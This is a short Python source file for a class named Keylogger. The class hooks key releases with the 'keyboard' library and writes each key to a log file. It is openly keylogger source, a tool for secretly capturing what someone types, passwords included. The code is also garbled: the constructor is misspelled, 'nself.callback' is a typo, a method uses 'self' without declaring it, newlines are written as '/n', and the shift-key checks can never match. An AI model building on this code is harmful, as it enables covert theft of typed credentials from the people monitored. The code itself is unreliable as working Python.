import keyboard
class Keylogger():
    def __innit__(self, log_filename):
        self.f = open(log_filename,"w")
    def start_log(self):
        keyboard.on_release(callback=nself.callback)    
        keyboard.wait()
    def new_key(event):
        button = event.name
        if button == "space":
            button = " "
        if button == "enter":
            button = "/n" 
        if button == "tab":
            button = "/n" 
        if button == "shift"+"9":
            button = "("
        if button == "shift"+"0":
            button = ")"
        if button == "shift"+"1":
            button = "!"   
        if button == "shift"+"2":
            button = "@"
        if button == "shift"+"3":
            button = "#"
        if button == "shift"+"5":
            button = "%"
        if button == "shift"+"7":
            button = "&"   
        if button == "shift"+"8":
            button = "*"
        self.f.write(button)
        self.f.flush()

